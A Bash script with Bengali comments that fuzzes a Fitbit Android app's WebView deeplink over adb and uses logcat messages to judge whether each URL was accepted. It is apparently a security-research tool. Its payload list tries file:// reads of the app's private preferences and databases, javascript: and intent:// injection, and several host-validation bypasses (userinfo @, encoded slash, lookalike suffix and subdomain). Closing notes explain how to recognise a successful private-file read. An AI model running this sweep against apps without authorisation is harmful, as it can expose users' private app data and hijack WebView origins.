#!/usr/bin/env bash
# mvrp-payload.sh — scheme-বৈচিত্র্যময় payload, আর oracle হিসেবে logcat।
#
# কেন নতুন করে:
#   ১. আগের deeplink sweep-এর একমাত্র প্রমাণ ছিল নেটওয়ার্ক canary। সেটা
#      cleartext-এ ব্লক হয়, HTTPS-এ পোলিং-দেরি করে, আর app ভেতরে কী সিদ্ধান্ত
#      নিল তা বলে না। ঘণ্টার পর ঘণ্টা গেছে যন্ত্র ঠিক করতে।
#
#      app নিজেই বলে দেয়। Fitbit-এর কোডে (S27):
#          "Cannot load %s (%s) in this WebView"
#      ওটা logcat-এ পড়ে — নেটওয়ার্ক, cleartext, অপেক্ষা কিছুই লাগে না।
#
#   ২. আমরা শুধু http/https পাঠিয়েছি। WebView-এর আসল আক্রমণ অন্য scheme-এ:
#      file:// (ব্যক্তিগত ফাইল), javascript: (origin-এ কোড),
#      content:// (নিয়ন্ত্রিত HTML), intent:// (component চালু)।
#
# ব্যবহার:
#   ./mvrp-payload.sh 'fitbit://webview?url=' com.fitbit.FitbitMobile
set -uo pipefail

BASE="${1:?ব্যবহার: $0 '<deeplink-prefix-ending-in=>' <package>}"
PKG="${2:?package লাগবে}"
OUT="${MVRP_OUT:-$HOME/mvrp}"
REP="$OUT/payload"; mkdir -p "$REP"
LOG="$REP/payload-$(date +%Y%m%d-%H%M).txt"
WAIT="${WAIT:-6}"

command -v adb >/dev/null || { echo "!! adb নেই"; exit 1; }

enc() { printf '%s' "$1" | sed 's|%|%25|g; s|:|%3A|g; s|/|%2F|g; s|?|%3F|g; s|&|%26|g; s|#|%23|g; s| |%20|g'; }

# ফায়ার করে ওই app-এর logcat ফিরিয়ে দাও
fire() {
  adb logcat -c >/dev/null 2>&1 </dev/null
  adb shell am start -a android.intent.action.VIEW -d "'$BASE$(enc "$1")'" >/dev/null 2>&1 </dev/null
  sleep "$WAIT"
  adb logcat -d 2>/dev/null </dev/null | tr -d '\r'
}

# app কী বলল সেটাই রায়। চারটে আলাদা অবস্থা — "কাজ করল / করল না" নয়।
verdict() {
  local o="$1"
  if   grep -qi 'Cannot load .* in this WebView' <<<"$o"; then echo REJECTED_BY_APP
  elif grep -qiE 'ERR_CLEARTEXT_NOT_PERMITTED' <<<"$o"; then echo CLEARTEXT_BLOCKED
  elif grep -qiE 'ERR_ACCESS_DENIED|ERR_FILE_NOT_FOUND|ERR_UNKNOWN_URL_SCHEME' <<<"$o"; then echo LOAD_REFUSED
  elif grep -qiE 'net::ERR' <<<"$o"; then echo NET_ERROR
  elif grep -qi 'WebFrameActivity\|WebViewClient\|chromium' <<<"$o"; then echo WEBVIEW_ACTIVE
  else echo NO_SIGNAL
  fi
}

{
echo "# payload sweep — logcat oracle"
echo "# base   : $BASE"
echo "# pkg    : $PKG"
echo "# when   : $(date -u +%Y-%m-%dT%H:%M:%SZ)"
echo "# device : $(adb shell getprop ro.product.model | tr -d '\r') / Android $(adb shell getprop ro.build.version.release | tr -d '\r')"
echo

echo "== CONTROL =="
# জানা-গ্রহণযোগ্য: app-এর নিজের host. যদি এটাও REJECTED দেখায়, oracle ভাঙা।
ctl=$(fire "https://www.fitbit.com/help")
echo "ACCEPT-CTL  https://www.fitbit.com/help  -> $(verdict "$ctl")"
# জানা-প্রত্যাখ্যাত: বাইরের host. REJECTED_BY_APP এলে oracle কাজ করছে, আর
# একই সাথে প্রমাণ হয় যাচাই authenticated ছাড়াও চলে — S27-এর পাঠ ভুল ছিল।
rej=$(fire "https://example.org/")
echo "REJECT-CTL  https://example.org/         -> $(verdict "$rej")"
echo

echo "== PAYLOAD =="
PRIV="/data/data/$PKG"
PAYLOADS=(
  "file://$PRIV/shared_prefs/"
  "file://$PRIV/databases/"
  "file:///etc/hosts"
  "file:///android_asset/"
  "javascript:document.title=1"
  "content://$PKG.fileprovider/root/x"
  "intent://x/#Intent;scheme=http;package=$PKG;end"
  "https://www.fitbit.com.evil.example/"
  "https://evilfitbit.com/"
  "https://www.fitbit.com@example.org/"
  "https://www.fitbit.com%2f@example.org/"
  "https://www.fitbit.com../"
)
for p in "${PAYLOADS[@]}"; do
  o=$(fire "$p"); v=$(verdict "$o")
  printf '%-18s %s\n' "$v" "$p"
  # app-এর নিজের কথাগুলো দেখাও — ওখানেই কারণ লেখা থাকে
  grep -iE 'Cannot load|net::ERR|WebFrame' <<<"$o" | head -2 | sed 's/^/                   /'
done

cat <<'NOTE'

== পড়ার নিয়ম ==
REJECTED_BY_APP   app নিজে না বলেছে — যাচাই কাজ করছে, ওই payload বন্ধ।
CLEARTEXT_BLOCKED নীতিতে আটকেছে, app-এর যাচাইয়ে নয়। ভিন্ন জিনিস।
LOAD_REFUSED      WebView scheme/ফাইল প্রত্যাখ্যান করেছে (ERR_ACCESS_DENIED =
                  file access বন্ধ; ERR_UNKNOWN_URL_SCHEME = scheme অসমর্থিত)।
WEBVIEW_ACTIVE    WebView কাজ করেছে আর কোনো ত্রুটি বলেনি -> **সবচেয়ে আগ্রহের**।
                  file:// হলে পর্দায় দেখো: ডিরেক্টরি তালিকা বা ফাইলের বিষয়বস্তু
                  দেখালে app-এর ব্যক্তিগত ফাইল পড়া হয়েছে।
NO_SIGNAL         deeplink রুট হয়নি, বা app কিছু বলেনি। অনিষ্পন্ন, নেতিবাচক নয়।

শেষ পাঁচটা payload host-যাচাইয়ের ক্লাসিক বাইপাস: suffix (evilfitbit),
subdomain-সদৃশ (fitbit.com.evil), userinfo (@), encoded slash, আর trailing dot।
endsWith/contains দিয়ে যাচাই করলে এগুলোর কোনো একটা পার হয়ে যায়।
NOTE
} 2>&1 | tee "$LOG"

echo
echo "রিপোর্ট: $LOG"
